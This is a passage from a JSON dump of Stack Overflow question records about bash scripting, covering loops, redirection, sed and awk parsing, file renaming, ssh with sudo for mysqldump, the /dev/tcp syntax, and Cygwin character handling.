bash?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/169511/how-do-i-iterate-over-a-range-of-numbers-in-bash\">How do I iterate over a range of numbers in bash?</a>  </p>\n</blockquote>\n\n\n\n<p>I am trying to print \"Hello World!\" 10 times via the code below, but it is printed only one time. Where am I missing the correct syntax?</p>\n\n<pre><code>RUNS=10\n\nfor RUN in {1..$RUNS}\ndo\n    echo \"Hello World!\"\ndone\n</code></pre>\n"},{"tags":["bash","environment-variables","variable-assignment"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":24,"score":1,"question_id":13245649,"title":"can seem to export environment variable from bash script","body":"<p>I am working on a remote server through putty and am trying to set certain environment variables throught something like this</p>\n\n<pre><code>#!/bin/bash\nVAR=\"SOME VALUE\"\nexport $VAR\n</code></pre>\n\n<p>when I exit the script and run echo on $VAR, I am given a blank line. could you please suggest a way around this.</p>\n"},{"tags":["linux","bash","ubuntu","whitespace","filenames"],"answer_count":9,"favorite_count":10,"up_vote_count":15,"down_vote_count":0,"view_count":13146,"score":15,"question_id":2709458,"title":"Bash script to replace spaces in file names","body":"<p>Can anyone recommend a safe solution to recursively replace spaces with underscores in file and directory names starting from a given root directory? For example,</p>\n\n<pre>\n$ tree\n.\n|-- a dir\n|   `-- file with spaces.txt\n`-- b dir\n    |-- another file with spaces.txt\n    `-- yet another file with spaces.pdf\n</pre>\n\n<p>becomes</p>\n\n<pre>\n$ tree\n.\n|-- a_dir\n|   `-- file_with_spaces.txt\n`-- b_dir\n    |-- another_file_with_spaces.txt\n    `-- yet_another_file_with_spaces.pdf\n</pre>\n\n<p><strong>Edit</strong></p>\n\n<p>Thanks for the answers; they all seem to work. I picked the one by Dennis as the main answer because it seems to me the simplest, even though it takes two steps.</p>\n"},{"tags":["php","regex","bash","replace"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":579,"score":1,"question_id":5928534,"title":"Bash String Remove Specific Characters","body":"<p>I'm almost done with using bash, but the last thing I need to do is to do a regex replace on a string in bash. I have the PHP equivalent here</p>\n\n<pre><code>preg_replace(\"/[^a-z0-9\\.]/\", '',$theme_name);\n</code></pre>\n\n<p>I need to do this exact same thing in bash, which is replacing every non alphanumeric character or dots (.) with nothing. Thanks in advance!</p>\n"},{"tags":["bash","unix","sed","awk"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13244827,"title":"How to reduce a set of lines to take the average?","body":"<p>I have a file with lines like these (columns are tab seperated)</p>\n\n<pre><code>2    1.414455    3.70898\n2    2.414455    3.80898\n2    3.414455    3.90898\n2    1.414455    3.90898\n4    4.414455    7.23898\n4    3.414455    6.23898\n4    5.414455    8.23898\n</code></pre>\n\n<p>i.e. there are consecutive lines where the first column is an integer, and rest two columns are floats.</p>\n\n<p>I want to reduce them as below</p>\n\n<pre><code>2    2.164455    3.75898\n4    4.414455    7.23898\n</code></pre>\n\n<p><strong>where I keep the first columns, and take the averages of the second and third columns for all elements with same first columns</strong>. The number of consecutive lines with same first elements might be different, but they will always be consecutive.</p>\n\n<p>I can do this in perl, but was wondering if there is a simpler bash / sed / awk mix that can do the same for me?</p>\n"},{"tags":["django","bash","installscript"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13243869,"title":"Install Django using pip from bash","body":"<p>I am trying to write an install script for my project which requires Django.  I am using pip to install a list of apps but when it gets to Django it says </p>\n\n<pre><code>    You just installed Django's auth system, which means you don't have any superusers defined.  \n    Would you like to create one now?\n</code></pre>\n\n<p>I need this script to be autonomous. </p>\n\n<p>Is there away to automatically answer this question or ignore it and set the superusers later?</p>\n\n<p>My basic bash script looks something like this </p>\n\n<pre><code>    #!/bin/bash\n\n    set -eux\n\n    #==================================================#\n    # These should be just the server requirements only \n    # !! Exception being scipy for now. pip install not \n    # working\n    #==================================================#\n\n    apt-get install -y python postgresql-9.1 apache2 python-setuptools postgresql-server-dev-9.1 postgresql-9.1-postgis postgis python-scipy binutils libproj-dev gdal-bin git\n\n    #==================================================#\n    # setup the posgis template for postgresql\n    #==================================================#\n    GEOGRAPHY=0\n    POSTGIS_SQL=postgis.sql\n\n    BLAH BLAH !!!\n    Lots of database set up code here\n\n   #==================================================#\n   # Setup the python environment\n   #==================================================#\n   easy_install virtualenv\n   easy_install virtualenvwrapper\n   easy_install pip\n\n   #==================================================#\n   # Pull the catami code from git and install \n   #==================================================#\n\n   mkdir -p /home/catami\n   mkdir -p /home/catami/catamiportal\n   cd /home/catami/catamiportal\n   git clone https://github.com/catami/catami.git\n   cd catami\n\n   pip install -r requirements.txt\n\n   python manage.py syncdb\n\n   manage.py runserver 0.0.0.0:8000\n</code></pre>\n\n<p>I am getting grief from installing django from the requirements file.</p>\n"},{"tags":["regex","string","bash","parsing"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":13240348,"title":"Bash: Extracting domain name from string","body":"<p>I am writing a bash script to extract a domain out of string of the form:</p>\n\n<p>\"....domain name xxx.com...\"</p>\n\n<p>and I want to output xxx.com.</p>\n\n<p>How can I use matching to output this domain name?</p>\n"},{"tags":["bash","shell","sqlplus"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":3809,"score":1,"question_id":10277983,"title":"Connect to sqlPlus in shell script and run a .sql script file","body":"<p>I have a .sql file which is a bunch of oracle pl/sql commands and i want to create a shell script to run these commands. \nsuppose user/pass@server is my credentials. What swill be the shell script to do such a work? </p>\n"},{"tags":["bash","unix","shell"],"answer_count":9,"favorite_count":82,"up_vote_count":196,"down_vote_count":0,"view_count":105683,"score":196,"question_id":818255,"title":"In the bash shell, what is \" 2>&1 \"?","body":"<p>In a unix shell, if I want to combine stderr and stdout into the stdout stream for further manipulation, I can append the following on the end of my command:</p>\n\n<pre><code>2&gt;&amp;1\n</code></pre>\n\n<p>So, if I want to use \"head\" on the output from g++, I can do something like this:</p>\n\n<pre><code>g++ lots_of_errors 2&gt;&amp;1 | head\n</code></pre>\n\n<p>so I can see only the first few errors. </p>\n\n<p>I always have trouble remembering this, and I constantly have to go look it up, and it is mainly because I don't fully understand the syntax of this particular trick.  Can someone break this up and explain character by character what \"2>&amp;1\"  means?</p>\n"},{"tags":["bash","shell","shell-exec"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":10774701,"title":"What's wrong with my shell script","body":"<p>I have a shell script which has a for loop that prints the value of an array element.\nThe array size is 2 but when running the for loop with that array I'm not getting proper output.</p>\n\n<p>Here is the shell script:</p>\n\n<pre><code>#!/bin/bash\n\narry=$(ls /home/developer/.ssh/  | grep \"\\.pub\")\ndeclare -a ARR\ni=0\nfor key in $arry\ndo\n  ARR[i]=$(echo $key | sed 's/.pub//g')\n  i=$((i+1))\ndone\necho ${#ARR[@]}\n## the below for loop is not iterating as expected\nfor pri in $ARR\ndo\n echo $pri\ndone\n</code></pre>\n\n<p>Now instead of giving the output </p>\n\n<pre><code>2\na\nheroku\n</code></pre>\n\n<p>The above code produces:</p>\n\n<pre><code>2\na\n</code></pre>\n\n<p>What is wrong with the above shell code?</p>\n\n<p>I'm relatively new to shell script so pardon my code I you feel it not good</p>\n\n<p>Attaching screenshot of the output\n<img src=\"http://i.stack.imgur.com/mZoAK.png\" alt=\"enter image description here\"></p>\n"},{"tags":["bash","groovy","external-process"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":202,"score":0,"question_id":11851137,"title":"Run external process from groovy","body":"<p>i have a bash script which i want to execute from groovy like</p>\n\n<pre><code>some_shell_script.sh param1 \"report_date=`some_function 0 \\\"%Y%m%d\\\"`\"\n</code></pre>\n\n<p>that script runs successfully from the command line, but when i try to execute it from Groovy</p>\n\n<pre><code>def command = \"some_shell_script.sh param1 \"report_date=`some_function 0 \\\"%Y%m%d_%H%M%S\\\"`\"\"\ndef sout = new StringBuffer()\ndef serr = new StringBuffer()\n//tried to use here different shells /bin/sh /bin/bash bash \nProcessBuilder pb = new ProcessBuilder(['sh', '-c',command])\nProcess proc = pb.start()\nproc.consumeProcessOutput(sout, serr)\n\ndef status = proc.waitFor()\n\nprintln 'sout: ' + sout\nprintln 'serr: ' + serr\n</code></pre>\n\n<p>i have the following error</p>\n\n<pre><code>serr: sh: some_function: command not found\n</code></pre>\n\n<p>at the same time</p>\n\n<pre><code>which some_function\n</code></pre>\n\n<p>returns functional definition like</p>\n\n<pre><code>some_function ()\n{\n;some definition here\n}\n</code></pre>\n\n<p>looks like when i run external script from groovy it start different process without context of parent process. I mean no function definitions of parent process are exists.</p>\n\n<p>Anyone have cue how to cope with such a situation?</p>\n"},{"tags":["ruby","bash","exec"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":40,"score":2,"question_id":13241753,"title":"ruby exec use functions from my ~/.bashrc","body":"<p>In my <code>~/.bashrc</code>, I have a function:</p>\n\n<pre><code>function sayHi() {\n    echo \"hi, $@\"\n}\n</code></pre>\n\n<p>and in Ruby I want to:</p>\n\n<pre><code>`sayHi \"friend\"`\n</code></pre>\n\n<p>however, <code>sayHi</code> is \"not found\" in whatever context ruby runs <code>exec</code> or <code>system</code>.</p>\n\n<p>How could I get Ruby to use functions in my <code>.bashrc</code>?</p>\n"},{"tags":["bash","unix","ssh"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":6599,"score":2,"question_id":4412238,"title":"What's the Cleanest Way to SSH and Run Multiple Commands in Bash?","body":"<p><br>\nI already have ssh agent setup, and I can run commands on an external server in bash script doing stuff like:\n<code> ssh blah_server \"ls; pwd;\"<br></code>\nNow, what I'd really like to do is run a lot of long commands on an external server. Enclosing all of these in between quotation marks would be quite ugly, and I'd really rather avoid sshing multiple times just to avoid this. \n<br><br>\nSo, is there a way I can do this in one go enclosed in parentheses or something? I'm looking for something along the lines of:<br><br>\n<code>ssh blah_server (<br>\nls some_folder;<br>\n./someaction.sh<br>\npwd;<br>\n)<br><br></code>\nBasically, I'll be happy with any solution as long as it's clean. Thanks in advance!</p>\n\n<p>[EDIT]<br>To clarify, I'm talking about this being part of a larger bash script. Other people might need to deal with the script down the line, so I'd like to keep it clean. I don't want to have a bash script with one line that looks like:<br>\n<code> ssh blah_server \"ls some_folder; ./someaction.sh 'some params'; pwd; ./some_other_action 'other params';\"</code><br>\nbecause it is extremely ugly and difficult to read.<br>[/EDIT]</p>\n"},{"tags":["linux","bash","vim","ubuntu","terminal"],"answer_count":5,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":1086,"score":5,"question_id":6380635,"title":"go to exact line in terminal on Ubuntu","body":"<p>I just start using Ubuntu just a few days ago. Now I'm trying to edit some file using <code>vi</code>. Some files are quite long so when I want to go to the middle of the file, I've to scroll down. Is there any shortcut to go to an exact line number?</p>\n"},{"tags":["arrays","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":37,"score":2,"question_id":13240564,"title":"How to search for consecutive numbers from a group of numbers using bash or python","body":"<p>I have a list of numbers like below:</p>\n\n<pre><code>1  0/1\n2  1/1\n3  1/1\n4  1/1\n5  1/1\n6  1/1\n7  0/1\n8  0/1\n</code></pre>\n\n<p>If the column 2 is \"1/1\" for consecutive rows, I would like to report the start and end of positions, say, in here, it should be: 2-6</p>\n\n<p>How should I do this applying some simple bash code, or python if necessary?</p>\n\n<p>many thanks</p>\n"},{"tags":["bash"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13240061,"title":"Access directory with and without execute permission","body":"<p>I used the following commands in linux environment</p>\n\n<p>[junk is a directory]</p>\n\n<pre>\nchmod –x junk      \nls junk \nls –l junk\n</pre>\n\n<p>I got the outputs as..</p>\n\n<pre>\n ls: cannot access junk/5: Permission denied  \n ls: cannot access junk/1: Permission denied  \n ls: cannot access junk/2: Permission denied  \n ls: cannot access junk/4: Permission denied  \n ls: cannot access junk/3: Permission denied \n 1  2  3  4  5\n</pre>\n\n<p>and</p>\n\n<pre>\n  ls: cannot access junk/5: Permission denied \n  ls: cannot access junk/1: Permission denied \n  ls: cannot access junk/2: Permission denied \n  ls: cannot access junk/4: Permission denied \n  ls: cannot access junk/3: Permission denied \n  total 0\n  -????????? ? ? ? ?            ? 1\n  -????????? ? ? ? ?            ? 2\n  -????????? ? ? ? ?            ? 3\n  -????????? ? ? ? ?            ? 4\n  -????????? ? ? ? ?            ? 5\n</pre>\n\n<p>I googled it found that if a directory does not have the execute permission then its inode can not be accessed. My question is here if the inode of the directory \"junk\" is not accessible then how the name of the files in the directory are being shown?</p>\n"},{"tags":["osx","bash","shell","unix","sed"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":13236566,"title":"Extract multiple captured groups from sed to variables","body":"<p>I have the following text</p>\n\n<pre><code>abc &lt;THIS&gt; abc &lt;THAT&gt; abc &lt;WHAT&gt; abc\n</code></pre>\n\n<p>where <code>abc</code> is a placeholder for a well defined expression. I'd like to extract the 3 terms in the brackets and save them in 3 separate variables. Is is possible to do that without parsing the text 3 times? Basically I'd like to capture and somehow \"export\" multiple groups.</p>\n\n<p>It's clear that I can extract one of them like this:</p>\n\n<pre><code>VARIABLE=`echo $TEXT | sed \"s_abc &lt;\\(.*\\)&gt; abc &lt;.*&gt; abc &lt;.*&gt; abc_\\1_g\"`\n</code></pre>\n\n<p>But is it possible to get all 3 of them without running <code>sed</code> 3 times?</p>\n\n<p>Other (portable) solutions without <code>sed</code> are also welcome.</p>\n"},{"tags":["bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":61,"score":0,"question_id":13233074,"title":"Shell Script : Join small gzipped files into larger files without unzipping them","body":"<p>I have some 8000 gz files of around 60MB each. I want to merge them into few larger files. So how to do it in a bash script <strong>without unzipping them</strong> ?</p>\n\n<p>Shell script may take input as new-file-size or number of files to combine.</p>\n\n<p>For example say I have 1.gz, 2.gz, 3.gz ... 10.gz\nNow I need one file per say 3 files, so now 1.gz, 2.gz and 3.gz will combine into 1_new.gz and so on.</p>\n"},{"tags":["bash","parsing","script"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13238396,"title":"parse result of bash command","body":"<p>I am new to bash scripting and am trying to parse out information from a whois result, specifically, the orgname and city fields.\nIs the proper way to save the result in a string and then parse the string for the relevant information? like:</p>\n\n<pre><code>    RESULT=whois &lt;ip&gt;\n    # parse RESULT\n</code></pre>\n\n<p>Any help would be greatly appreciated.</p>\n"},{"tags":["linux","bash","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":13238573,"title":"Need a way to temporarily redirect STDOUT","body":"<p>I know how to redirect output in Linux.  Thing is, I have alot of output in my bash script and I don't want to type something like</p>\n\n<pre><code>echo $foo &gt;&gt; bar\n</code></pre>\n\n<p>over and over again.  I would much rather do something like:</p>\n\n<pre><code>hey, bash, for the time being put all your STDOUT in \"bar\"\necho $foo\n.\n.\nOK, bash, you can go back to regular STDOUT now\n</code></pre>\n\n<p>I tried opening FD 1 as a file:</p>\n\n<pre><code>exec 1&gt;bar\n</code></pre>\n\n<p>but couldn't get STDOUT back to normal when I was done.  Closing the file</p>\n\n<pre><code>exec 1&gt;&amp;-\n</code></pre>\n\n<p>gave me errors that I couldn't get around.</p>\n\n<p>Any way to do this?  Thanks!</p>\n"},{"tags":["bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13237279,"title":"bash read command","body":"<p>I try to use read command to catch what user enters.</p>\n\n<pre><code>read -p \"Please enter your name -&gt; \" -n 20 name\n</code></pre>\n\n<p>But I figured out that we can't rectify what we have entered. How can I make the \"BackSpace\" remove and not add?</p>\n"},{"tags":["bash","shell","local"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":237,"score":4,"question_id":4421257,"title":"Why does \"local\" sweep the return code of a command?","body":"<p>I was experiencing a problem with exit codes in a Bash script (using GNU bash 4.1.7) till I found its origin in this surprising (at least for me) behavior of <code>local</code>. Let me show a simplified example:</p>\n\n<pre><code>$ fun() { local x=$(false); echo \"exit code: $?\"; }; fun\nexit code: 0\n</code></pre>\n\n<p>Compare it with:</p>\n\n<pre><code>$ fun() { x=$(false); echo \"exit code: $?\"; }; fun\nexit code: 1\n</code></pre>\n\n<p>The last one works as I would expect. I've read the <a href=\"http://linux.die.net/man/1/bash\" rel=\"nofollow\">manual page</a>, the <a href=\"http://tldp.org/LDP/abs/html/localvar.html\" rel=\"nofollow\">TLDP tutorial</a>, but I found no references to this specific situation. Can anyone explain that behavior?</p>\n"},{"tags":["bash","shell","grep","pipe"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":62,"score":2,"question_id":13195285,"title":"Pipe multiple commands to a single command with no EOF signal wait","body":"<p>How can I pipe the std-out of multiple commands to a single command? Something like:</p>\n\n<pre><code>(cat my_program/logs/log.*;tail -0f my_program/logs/log.0) | grep \"filtered lines\"\n</code></pre>\n\n<p>I want to run all the following commands on a single command-line using pipes and no redirects to a temp file (if possible). There is one small nuance that means I can't use parentheses; I want the last command to be a tail feed so I want the grep to happen after every line is received by the std-in - not wait for EOF signal. </p>\n"},{"tags":["bash","quoting"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13235812,"title":"read a variable line by line without gobbling the \\ character","body":"<p>I am using this snippet to read a variable line by line:</p>\n\n<pre><code>echo \"${lines}\" | while read line; do something with ${line}; done\n</code></pre>\n\n<p><code>lines</code> contains new lines and occurrences of the <code>\\</code> character (the <code>line</code> will be interpreted as a <code>C</code> string). Unfortunately, somewhere in this code the <code>\\</code> characters are simply stripped. Why, and how do I fix that?</p>\n\n<p>EDIT:\na sample input is this:</p>\n\n<pre><code>foo $'bar'\nfee $'ber\\fbir'\n</code></pre>\n\n<p>note that only the <code>\\</code> is stripped, not the <code>$''</code> which will be used later to interpret the string as a <code>C</code> string.</p>\n"},{"tags":["css","bash","csslint"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13234414,"title":"How do you use csslint from the command line?","body":"<p>I'm new at Ubuntu, I'll be the first to admit that, but I need to integrate <code>csslint</code> into a CI build script and I found the about page on the <code>csslint</code> site unhelpful.  It gave me two options for installing <code>csslint</code> but they require either <code>node</code> or <code>rhino</code>:</p>\n\n<pre><code>Node.js:\nsudo npm install -g csslint\n\nRhino.js:\njava -jar rhino.jar csslint-rhino.js --rules= ~ /* suppressed for simplicity */\n</code></pre>\n\n<p>Now having hit google I'm finding myself trying to find either of these in a format I know how to work with. On google groups I found someone asking a similar question, so I'm not the only one who is having this problem, but the answer was that <code>rhino</code> is not a ready made product you install and run but a library you work with.</p>\n\n<p>All I need to do is pass css files to <code>csslint</code> through bash with <code>csslint</code> args get the response back and evaluate whether or not the build should fail due to violations.  Is there anywhere I can find step-by-step instructions that include dependencies such as <code>node</code> or <code>rhino</code>?</p>\n\n<p>Thanks everyone.</p>\n\n<p>-- Update</p>\n\n<p>Found the answer myself and decided to put it here to help others.</p>\n\n<ol>\n<li>sudo apt-get install npm,</li>\n<li>sudo npm install -g csslint,</li>\n<li>csslint pathtofile.css,</li>\n<li>have feelings hurt.</li>\n</ol>\n\n<p>Now you're at this point the website documentation is useful so here is a link to it:</p>\n\n<p><a href=\"http://csslint.net/about.html#docs\" rel=\"nofollow\">http://csslint.net/about.html#docs</a></p>\n"},{"tags":["android","bash","shell","sh"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12904693,"title":"Shell - get android devices into array","body":"<p>I am new to shell scripting and am trying to get all the android devices in an array but my array is empty when the function is finished.</p>\n\n<pre><code>#!/bin/bash\n\ndeclare -a arr\nlet i=0\n\nMyMethod(){\n  adb devices | while read line #get devices list\n  do\n    if [ ! \"$line\" == \"\" ] &amp;&amp; [ `echo $line | awk '{print $2}'` == \"device\" ]\n    then\n      device=`echo $line | awk '{print $1}'`\n      echo \"Add $device\"\n      arr[$i]=\"$device\"\n      let i=$i+1\n    fi\n  done\n\necho \"In MyMethod: ${arr[*]}\"\n}\n\n################# The main loop of the function call #################\n\nMyMethod\necho \"Not in themethod: ${arr[*]}\"\n</code></pre>\n\n<p><code>arr</code> - is empty, what am I doing wrong?</p>\n\n<p>Thanks for advice.</p>\n"},{"tags":["bash","text"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":61,"score":1,"question_id":11204826,"title":"bash: how to flatten columns in text file?","body":"<p>I have a file like this:</p>\n\n<pre><code>foo, bar, foo1\nbar, foo\nfoo\n</code></pre>\n\n<p>I want it like this:</p>\n\n<pre><code>foo\nbar\nfoo1\nbar\nfoo\nfoo\n</code></pre>\n"},{"tags":["linux","bash","process"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2580,"score":3,"question_id":3790895,"title":"Linux / Bash, using ps -o to get process by specific name?","body":"<p>I am trying to use the ps -o command to get just specific info about processes matching a certain name. However, I am having some issues on this, when I try to use this even to just get all processes, like so, it just returns a subset of what a normal <code>ps -ef</code> would return (it doesn't return nearly the same number of results so its not returning all running processes)</p>\n\n<pre><code>ps -ef -o pid,time,comm\n</code></pre>\n\n<p>I want to try something like this (below) but incorporate the ps -o to just get specific info from it (just the PID)</p>\n\n<pre><code>ps -ef |grep `whoami`| grep firefox-bin\n</code></pre>\n\n<p>Any advice is appreciated as to how to do this properly, thanks </p>\n"},{"tags":["bash","variables","script"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13233452,"title":"Bash variable change doesn't persist","body":"<p>I have a short bash script to check to see if a Python program is running. The program writes out a PID file when it runs, so comparing this to the current list of running processes gives me what I need. But I'm having a problem with a variable being changed and then apparently changing back! Here's the script:</p>\n\n<pre><code>#!/bin/bash\n# Test whether Home Server is currently running\nPIDFILE=/tmp/montSvr.pid\nisRunning=0\n# does a pid file exist?\nif [ -f \"$PIDFILE\" ]; then\n  # pid file exists\n  # now get contents of pid file\n  cat $PIDFILE | while read PID; do\n    if [ $PID != \"\" ]; then\n      PSGREP=$(ps -A | grep $PID | awk '{print $1}')\n      if [ -n \"$PSGREP\" ]; then\n        isRunning=1\n        echo \"RUNNING: $isRunning\"\n      fi\n    fi\n  done\nfi\necho \"Running: $isRunning\"\nexit $isRunning\n</code></pre>\n\n<p>The output I get, when the Python script <em>is</em> running, is:</p>\n\n<pre><code>RUNNING: 1\nRunning: 0\n</code></pre>\n\n<p>And the exit value of the bash script is 0. So isRunning is getting changed within all those if statements (ie, the code is performing as expected), but then somehow isRunning reverts to 0 again. Confused...</p>\n"},{"tags":["linux","bash","shell"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":13233116,"title":"Calling one function within another function","body":"<p>I am trying to call one bash function from within another bash function and it is not working as expected : </p>\n\n<pre><code>#/bin/bash\nfunction func1(){\n    echo \"func1 : arg = ${1}\"\n    return 1\n}\nfunction func2(){\n    echo \"func2 : arg = ${1}\"\n    local var=func1 \"${1}\"\n    echo \"func2 : value = $var\"\n}\nfunc2 \"xyz\"\n</code></pre>\n\n<p>and the current output is :</p>\n\n<pre><code>Current output :\nfunc2 : arg = xyz\nfunc2 : value = func1\n</code></pre>\n\n<p>Question : how can I modify the program above so as to get the following output ? : </p>\n\n<pre><code>Desired output : \nfunc2 : arg = xyz\nfunc1 : arg = xyz\nfunc2 : value = 1\n</code></pre>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":13232218,"title":"Passing parameters with spaces","body":"<p>Why is the output of <code>test foo bar</code> only <code>foo</code> instead of <code>foo bar</code>?</p>\n\n<pre><code>$ cat test\nfunction f\n{\n    local args=$1\n\n    echo $args\n}\nf \"$@\"\n\n$ bash test foo bar\nfoo\n</code></pre>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13231354,"title":"bash cut to variable and cd","body":"<p>Hi i am having a really strange problem.\nI am trying to run the following scrip as root:</p>\n\n<pre><code>loc=$(transmission-remote 192.168.1.74:9091 --auth=user:password -t$TORRENTID -i |sed -e '1d;$d;s/^ *//'|grep Location: |cut -s -d : -f2) \ncd \"$loc\"\n</code></pre>\n\n<p>But get the error messege :</p>\n\n<pre><code>cd: can't cd to  /leprechaun_tv-shows/download/\n</code></pre>\n\n<p>But i works if i create a new string:</p>\n\n<pre><code>hello= /leprechaun_tv-shows/download/ \ncd $hello\n</code></pre>\n\n<p>what am i doing wrong?</p>\n"},{"tags":["linux","bash","sockets","tcp"],"answer_count":2,"favorite_count":5,"up_vote_count":11,"down_vote_count":0,"view_count":543,"score":11,"question_id":7765004,"title":"TCP connection, bash only","body":"<p>I found this line in a script. While I globally understand what it does--opening a bidirectional TCP connection--, I need some explanations on the syntax. Here's the line:</p>\n\n<pre><code>exec 5&lt;&gt;\"/dev/tcp/${SERVER}/${PORT}\"\n</code></pre>\n\n<p>And my questions:</p>\n\n<ol>\n<li><code>&lt;</code> and <code>&gt;</code> are usually used to redirect IOs. What does it mean there? Is it usable in another context? How?</li>\n<li>Why does it work, while <code>/dev/tcp</code> doesn't exists? </li>\n<li>Why 5? Can it be another number? What are the values allowed?</li>\n<li>Why is <code>exec</code> necessary? (given nothing is actually <em>executed</em>)</li>\n</ol>\n\n<p>Thanks.</p>\n"},{"tags":["bash","ssh","mysqldump","sudo"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13224763,"title":"sudo'd mysqldump over ssh syntax?","body":"<p>I'd like a single command that:</p>\n\n<ul>\n<li>ssh's into my server as user foo, using the public keys I have set up</li>\n<li>executes a mysqldump of some database with the /etc/mysql/debian.cnf defaults-file</li>\n<li>to stdout, so I can pipe it locally</li>\n<li>while doing a sudo on the server remotely, because user foo is not allowed to read /etc/mysql/debian.cnf. foo is allowed to sudo bash but not sudo mysqldump.</li>\n</ul>\n\n<p>This is the best I have come up:</p>\n\n<p><code>echo 'mysqldump --defaults-file=/etc/mysql/debian.cnf dbname' | ssh -t -i keys/id_rsa -l foo example.com sudo bash -s</code></p>\n\n<p>This ugly beast works, but produces: <code>Pseudo-terminal will not be allocated because stdin is not a terminal.</code>, and I really don't like the echo. There must be a better way?</p>\n"},{"tags":["bash","dns","ip-address","nslookup"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13230318,"title":"nslookup output","body":"<p>Here's some simple output from nslookup:\n    nslookup www.go2linux.org\n    Server:         4.2.2.2\n    Address:        4.2.2.2#53</p>\n\n<p>What does <code>#53</code> mean over there?</p>\n"},{"tags":["bash","file-rename"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13227452,"title":"Remove multiple extensions from all files in a directory (Bash)","body":"<p>Thanks to messing up my first attempts to do this, I now have a directory full of files that are now named like this:</p>\n\n<pre><code>valery-special-music-poetry.txt.mtxt.md.md.txt.mtxt.md.md.md\n</code></pre>\n\n<p>which I need to be named:</p>\n\n<pre><code>valery-special-music-poetry.md\n</code></pre>\n\n<p>how can I do this from the command line?</p>\n\n<p>I am running: GNU bash, version 3.2.48(1)-release (x86_64-apple-darwin12)</p>\n"},{"tags":["bash","cygwin","accented-strings"],"answer_count":0,"favorite_count":4,"up_vote_count":13,"down_vote_count":1,"view_count":212,"score":12,"question_id":13094248,"title":"How do I get accented letters to actually work on bash?","body":"<p>My bash installation on cygwin doesn't handle accented letters properly. I tried adding</p>\n\n<pre><code>set input-meta on    # to accept 8-bit characters\nset output-meta on   # to show 8-bit characters\nset convert-meta on  # to show it as character, not the octal representation\n</code></pre>\n\n<p>to my input rc, but this doesn't quite work yet. Indeed, if I type</p>\n\n<pre><code>$ echo ù\n</code></pre>\n\n<p>then before i press enter it is automatically changed to</p>\n\n<pre><code>$ echo \\303\n</code></pre>\n\n<p>although the output is right, for I get</p>\n\n<pre><code>$ echo \\303\nù\n</code></pre>\n\n<p>I get the same result for anyother accented letter. Usually though I use a non-italian keyboard, and I use <code>autohotkey</code> to substitute letters with an apostrophe after them with an accented letter. When this is the case, accented letters get substituted with a <code>\\302</code>, and they print garbage depending on the letter: prints a <code>3y</code> for a <code>ù</code>, a <code>¢</code> for an <code>ò</code>, and nothing for everething else.</p>\n\n<p>How do I get all this to make sense?</p>\n\n<p>EDIT: my locale settings, cygwin version and terminal are the following</p>\n\n<pre><code>$ uname -a\nCYGWIN_NT-6.1-WOW64 ferdi-Asus 1.7.17(0.262/5/3) 2012-10-19 14:39 i686 Cygwin\n$ locale\nLANG=it_IT.UTF-8\nLC_CTYPE=\"it_IT.UTF-8\"\nLC_NUMERIC=\"en_US.UTF-8\"\nLC_TIME=\"it_IT.UTF-8\"\nLC_COLLATE=\"it_IT.UTF-8\"\nLC_MONETARY=\"it_IT.UTF-8\"\nLC_MESSAGES=\"it_IT.UTF-8\"\nLC_ALL=\n$ tty\n/dev/pty1\n</code></pre>\n\n<p>I'm invoking it simply clicking the Cygwin terminal link. It redirects 